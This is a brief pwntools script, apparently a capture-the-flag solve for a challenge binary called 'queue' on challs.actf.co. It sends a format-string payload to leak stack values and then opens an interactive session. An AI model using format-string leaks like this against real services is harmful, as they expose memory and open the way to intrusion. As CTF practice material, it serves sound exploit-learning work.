#!/usr/bin/env python3

from pwn import *

exe = ELF("./queue_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('challs.actf.co', 31322)

    return r


def main():
    r = conn()

    r. sendlineafter(b'? ', b'%14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p')

    r.interactive()


if __name__ == "__main__":
    main()
